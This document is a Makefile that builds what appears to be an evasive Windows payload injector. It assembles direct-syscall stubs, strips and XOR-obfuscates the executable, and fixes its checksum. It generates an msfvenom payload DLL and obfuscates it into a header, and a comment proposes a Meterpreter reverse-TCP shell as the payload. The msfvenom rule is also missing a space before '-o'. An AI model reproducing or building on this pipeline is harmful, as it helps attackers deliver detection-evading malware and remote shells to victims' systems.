# Define the compiler, assembler, and tools
CC = x86_64-w64-mingw32-gcc
CC_NATIVE = gcc
ASM = nasm
OBJCOPY = x86_64-w64-mingw32-objcopy
STRIP = x86_64-w64-mingw32-strip

# Define output binaries
TARGET_EXE = injector.exe
TARGET_OBFS_EXE = obfsinjector.exe
OBFS_KEY = 144
OBFUSCATOR = obfs_src/obfuscator obfs_src/obfuscator.o obfs_src/binary_obfuscator.o obfs_src/payloadObfuscator obfs_src/payloadObfuscator.o

# Payload definition
PAYLOAD_CONFIG= windows/x64/messagebox # use whatever msfvenom payload/config you want. For example: windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT>
PAYLOAD_DLL = msfdll.dll #Change this accordingly to the name of your binary/payload. For testing, I will use msfvenom msgbox payload :)
PAYLOAD_HEADER = payload.h #do not change this please, or modify the code accordingly!

# Define source files
ASM_SRC = syscalls.asm
ASM_OBJ = syscalls.o

C_SRCS = $(wildcard ./*.c)
C_HDRS = $(wildcard ./*.h)
C_OBJS = $(C_SRCS:.c=.o)

C_OBFS_SRCS = $(wildcard obfs_src/*.c)
C_OBFS_HDRS = $(wildcard obfs_src/*.h)
C_OBFS_OBJS = $(C_OBFS_SRCS:.c=.o)

# Compilation flags
CFLAGS = -Wall -Wno-array-bounds -O2 
LDFLAGS = -O2 -flto -ffunction-sections -fdata-sections -lshlwapi -Wl,--section-alignment,4096 -Wl,--gc-sections -Wl,--strip-debug -Wl,--image-base,0x140000000
CFLAGS_NATIVE = -Os -Wall

# Default target
all: $(TARGET_EXE) $(PAYLOAD_DLL) $(OBFUSCATOR) $(PAYLOAD_HEADER)

# Assemble syscalls.asm
$(ASM_OBJ): $(ASM_SRC)
	$(ASM) -f win64 $(ASM_SRC) -o $(ASM_OBJ)

# Compile C files
./%.o: ./%.c $(C_HDRS)
	$(CC) $(CFLAGS) -c $< -o $@

obfs_src/%.o: obfs_src/%.c $(C_OBFS_HDRS)
	$(CC_NATIVE) $(CFLAGS_NATIVE) -c $< -o $@

obfs_src/obfuscator: obfs_src/obfuscator.o obfs_src/binary_obfuscator.o
	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/obfuscator.o obfs_src/binary_obfuscator.o -o obfs_src/obfuscator

obfs_src/payloadObfuscator: obfs_src/payloadObfuscator.o
	$(CC_NATIVE) $(CFLAGS_NATIVE) obfs_src/payloadObfuscator.o -o obfs_src/payloadObfuscator

# Link the injector executable
$(TARGET_EXE): $(PAYLOAD_HEADER) $(C_OBJS) $(ASM_OBJ) obfs_src/obfuscator
	$(CC) -o $(TARGET_EXE) $(C_OBJS) $(ASM_OBJ) $(PAYLOAD_HEADER) $(LDFLAGS)
	$(OBJCOPY) --rename-section .CRT=.data $(TARGET_EXE)
	$(STRIP) --strip-debug --strip-unneeded $(TARGET_EXE)
	./obfs_src/obfuscator $(TARGET_EXE) $(TARGET_OBFS_EXE) $(OBFS_KEY)
	python3 fix_checksum.py $(TARGET_OBFS_EXE)
# cleaning intermediary files
	rm -f $(ASM_OBJ) $(C_OBJS) $(OBFUSCATOR) $(TARGET_EXE) $(PAYLOAD_DLL)
	
$(PAYLOAD_HEADER): $(PAYLOAD_DLL) obfs_src/payloadObfuscator
	./obfs_src/payloadObfuscator $(PAYLOAD_DLL) $(OBFS_KEY)

$(PAYLOAD_DLL):
	msfvenom -p $(PAYLOAD_CONFIG)-o $(PAYLOAD_DLL)

# Clean up generated files
clean:
	rm -f $(ASM_OBJ) $(C_OBJS) $(TARGET_EXE) $(PAYLOAD_DLL) $(OBFUSCATOR) $(TARGET_OBFS_EXE) $(PAYLOAD_HEADER)
